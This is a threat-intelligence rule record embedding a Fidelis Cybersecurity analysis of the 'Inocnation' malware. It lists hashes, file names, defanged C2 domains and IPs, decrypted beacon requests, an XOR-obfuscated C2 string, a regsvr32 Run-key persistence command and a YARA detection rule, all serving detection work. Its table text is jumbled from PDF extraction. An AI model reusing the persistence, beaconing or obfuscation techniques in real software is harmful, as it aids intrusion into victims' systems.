{"rule_id": 426, "name": "FTA_1020_Fidelis_Inocnation_FINAL", "description": "-", "references": [], "File_Names": ["b9af5f5fd434a65d7aa1b55f5441c90a.dll", "adobe.bat", "Trojan.FHDR", "vpnui.exe", "d9821468315ccd3b9ea03161566ef18e.dll", "Center14430654.dat", "k9.exe", "Center111940519.dat", "Center111940519.exe"], "MD5_Hashes": ["75D3D1F23628122A64A2F1B7EF33F5CF", "d9821468315ccd3b9ea03161566ef18e", "75d3d1f23628122a64a2f1b7ef33f5cf", "e5665b3b3ffbbfcd5f2cbf31677fcbf9", "2F7E5F91BE1F5BE2B2F4FDA0910A4C16", "ee6cde0fdae9bfa6c18b3783a23d0952", "68F1419721354EC1f78A71E10B54FCA8", "b9af5f5fd434a65d7aa1b55f5441c90a", "c1cea8dced657cfc85b045a2421417f1", "A7BD555866AE1C161F78630A638850E7", "54d7948676ee96b2f9e0a141598b564d", "4e2b7dd08fa32594616a1d463e9b0975", "D9821468315CCD3B9EA03161566EF18E", "B9AF5F5FD434A65D7AA1B55F5441C90A", "bf619eac0cdf3f68d496ea9344137e8b", "69fc21366b719cab74f899fb18a8c26f", "886f6f3780467a511ae909d20390df5b", "5cb6e6e0fbe87eba975b5ae0efaf2ca4", "a7bd555866ae1c161f78630a638850e7", "4f4bf27b738ff8f2a89d1bc487b054a8", "4F4BF27B738FF8F2A89D1BC487B054A8", "76ae6bd3bce3f1fb9a86b9faac9b42be", "5c3d9bac10a06111e2bb1356bce6140a"], "SHA1_Hashes": ["3d7b789e3a630c0bd9db0b3217f72348025b845c", "9b1e902103f7e23d915f4d01c84779e0bdca6995", "b9308a65383681b862e16e4c042dbf7a61cce716"], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \n\nAnalysis of the file with MD5 Hash: D9821468315CCD3B9EA03161566EF18E\n\nThis DLL payload is the same malware family, contains the same inocnation[dot]com C2 configuration as the one dropped by the file with the \nMD5 Hash: 4F4BF27B738FF8F2A89D1BC487B054A8, but looks to be compiled via a slightly different source.\n\nd9821468315ccd3b9ea03161566ef18e \nb9308a65383681b862e16e4c042dbf7a61cce716 \n0x55ECEE49 [Mon Sep 07 01:54:17 2015 UTC] \nMicrosoft Visual C++ v6.0 DLL \n\nFile Metadata \nFile Name:  d9821468315ccd3b9ea03161566ef18e.dll \nFile Size:  28672 bytes \nMD5:   \nSHA1:   \nPE Time: \nPEID Sig: \nSections (5): \n  Name  \n  .text \n  .rdata \n  .data \n  .rsrc \n  .reloc \n\nMD5 \nee6cde0fdae9bfa6c18b3783a23d0952 \n886f6f3780467a511ae909d20390df5b \n54d7948676ee96b2f9e0a141598b564d \ne5665b3b3ffbbfcd5f2cbf31677fcbf9 \nc1cea8dced657cfc85b045a2421417f1\n\nEntropy   \n6.48   \n4.77   \n1.16   \n5.55   \n4.64   \n\n11\n\nWWW.FIDELISSECURITY.COM\u00a9Fidelis CybersecurityTA#1020_FIDELIS_INOCNATION_1512 \n \n\fWhen this malicious DLL is executed by calling it with its \u201cDllRegisterServer\u201d function, the Victim system establishes a secure and encrypted \nconnection on port 443 and beacons with the following request (encryption layer removed).\n\nPOST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio7 HTTP/1.1 \nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko \nHost: inocnation[dot]com \nContent-Length: 8 \nConnection: Keep-Alive\n\nAnalysis of the file with MD5 Hash: B9AF5F5FD434A65D7AA1B55F5441C90A\n\nThis is a malicious DLL that belongs to the same malware family as the one dropped by \u201c4f4bf27b738ff8f2a89d1bc487b054a8\u201d, and is almost \nbyte-by-byte exactly similar except for the fact that it beacons to a different C2 domain mail.cbppnews[dot]com.  This DLL also contains the \nbasic export functions of DllRegisterServer and DllUnregisterServer.  The main difference with the other malware is the C2 server.\n\nFile Metadata \nFile Name: b9af5f5fd434a65d7aa1b55f5441c90a.dll \nFile Size:  22016 bytes \nMD5:        b9af5f5fd434a65d7aa1b55f5441c90a \nSHA1:       9b1e902103f7e23d915f4d01c84779e0bdca6995 \nPE Time:    0x55372A7A [Wed Apr 22 04:58:34 2015 UTC] \nPEID Sig:   Microsoft Visual C++ v6.0 DLL \nSections (4): \n  Name      Entropy  MD5 \n  .text     6.46     5c3d9bac10a06111e2bb1356bce6140a \n  .rdata    4.64     76ae6bd3bce3f1fb9a86b9faac9b42be \n  .data     0.0      bf619eac0cdf3f68d496ea9344137e8b \n  .reloc    4.28     4e2b7dd08fa32594616a1d463e9b0975\n\nWhen this malicious DLL is executed the Victim system establishes a secure and encrypted connection on port 443 and beacons with the \nfollowing request (encryption layer removed).\n\nPOST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9 HTTP/1.1 \nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko \nHost: mail.cbppnews[dot]com \nContent-Length: 8 \nConnection: Keep-Alive\n\nThe following string represents the obfuscated format of the Command & Control (C2) domain:\n\n00B9FD24  25 48 29 48 21 48 24 48 66 48 2B 48 2A 48 38 48  %H)H!H$HfH+H*H8H \n00B9FD34  38 48 26 48 2D 48 3F 48 3B 48 66 48 2B 48 27 48  8H&H-H?H;HfH+H\u2019H \n00B9FD44  25 48                                           \n\nThe C2 domain is de-obfuscated using the same code observed in the analysis of the \u201c75D3D1F23628122A64A2F1B7EF33F5CF\u201d (malicious DLL \npayload dropped into the system), but in this case the XOR keys used are different from the sample previously analyzed. The XOR keys used are \n0x39 and 0x71.\n\n12\n\nWWW.FIDELISSECURITY.COM\u00a9Fidelis CybersecurityTA#1020_FIDELIS_INOCNATION_1512\fAppendix B: File Summary and Technical Indicators\n\nMD5\n\nFile name\n\na7bd555866ae1c161f78630a638850e7 Win-Release-web-deploy.\n\nAV Hits\n17\n\nCommon Risk Name\nTrojan.CryptRedol\n\n5cb6e6e0fbe87eba975b5ae0efaf2ca4\n\nexe\n\nCenter14430654.dat / any-\nconnect-win-4.1.04011-\nweb-deploy-k9.exe\n\n0\n\nNone\n\n4f4bf27b738ff8f2a89d1bc487b054a8\n\nCenter111940519.dat\n\n12\n\n75d3d1f23628122a64a2f1b7ef33f5cf\n\nadobe.dat\n\nd9821468315ccd3b9ea03161566ef18e\n\n\u2018unknown\u2019\n\nb9af5f5fd434a65d7aa1b55f5441c90a\n\nadobe.dat\n\n4\n\n4\n\n5\n\nTrojan.CryptRedol.\nGen.3\n\nTrojan-FH-\nDR!75D3D1F23628\n\nTrojan.FHDR!tr\n\nTrojan-FHDR! \nBackdoor.HIXOR.A \nTrojan.A!tr\n\nNotes\nLauncher/\nDropper\n\nLegit Cisco \nAnyConnect \nMobility Cli-\nent installer \n\nMalware \ninstaller\n\nMalicious \nDLL\n\nMalicious \nDLL\n\nMalicious \nDLL\n\nCompile Date\nThu Aug 06 \n05:34:53 2015\n\nMon Mar 01 \n10:28:24 2010\n\nThu Aug 06 \n04:47:17 2015\n\nWed Apr 22 \n04:58:34 2015\n\nMon Sep 07 \n01:54:17 2015\n\nWed Apr 22 \n04:58:34 2015\n\nIndicator List: \nFile Entrenchment Paths: \n%TEMP%\\Center1[Decimal_Result_of_GetTickCount].dat \n%TEMP%\\Center[Decimal_Result_of_GetTickCount].dat \n%AppData%\\adobe\\adobe.dat \n\nPersistence Location: \n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] \nAdobePlayer=\u201dregsvr32 /s %AppData%\\malware\\adobe\\adobe.dat\u201d\n\nMemory Artifacts: \ninocnation[dot]com \nmail.cbppnews[dot]com \n1a53b0cp32e46g0qio9\n\nHashes: \nA7BD555866AE1C161F78630A638850E7 \n4F4BF27B738FF8F2A89D1BC487B054A8 \n75D3D1F23628122A64A2F1B7EF33F5CF \nD9821468315CCD3B9EA03161566EF18E \nB9AF5F5FD434A65D7AA1B55F5441C90A\n\nDNS: \ninocnation[dot]com \nmail.cbppnews[dot]com\n\nResolved IPs: \n211.104.106[.]41 (inocnation from August to October, 2015) \n87.198.23[.]40 (inocnation, current) \n202.172.32[.]160 (cbppnews, current)\n\n13\n\nWWW.FIDELISSECURITY.COM\u00a9Fidelis CybersecurityTA#1020_FIDELIS_INOCNATION_1512 \n \n\fYARA: \nrule apt_win32_dll_rat_1a53b0cp32e46g0qio7 \n{ \n\nmeta: \n\nhash1 = \u201c75d3d1f23628122a64a2f1b7ef33f5cf\u201d \nhash2 = \u201cd9821468315ccd3b9ea03161566ef18e\u201d \nhash3 = \u201cb9af5f5fd434a65d7aa1b55f5441c90a\u201d \n\nstrings: \n\n// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko \n$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59  \n00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00  \n39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22  \n00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00  \nc7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7  \n[2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566 \n// Software\\Microsoft\\Windows\\CurrentVersion\\Run \n$ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24  \n00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00  \n66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00  \n00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00  \nc7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7  \n[2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09  \n\n$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? } \n// xor  \n// inc  \n// cmp       eax, 14h \n// Loop to decode a static string. It reveals the \u201c1a53b0cp32e46g0qio9\u201d static string sent \n\nword ptr [ebp+eax*2+var_5C], 14h \neax \n\nin the beacon\n\n$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0 \n$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621 \n$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640 \n$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } //  10003930 \n$ = \u201c%08x%08x%08x%08x\u201d wide ascii \n$ = \u201cWinHttpGetIEProxyConfigForCurrentUser\u201d wide ascii\n\ncondition: \n(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n\n}\n\n14\n\nWWW.FIDELISSECURITY.COMFidelis Cybersecurity  |  800.652.4020  |  info@fidelissecurity.comCONTACT US TODAY TO LEARN MORE ABOUT FIDELIS\u00a9Fidelis CybersecurityTA#1020_FIDELIS_INOCNATION_1512Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use. This document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Cybersecurity, Inc. While we have done our best to ensure that the material found in this document is accurate, Fidelis Cybersecurity, Inc. makes no guarantee that the information contained herein is error free. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\f"], "URLs": [], "weight": 0.0}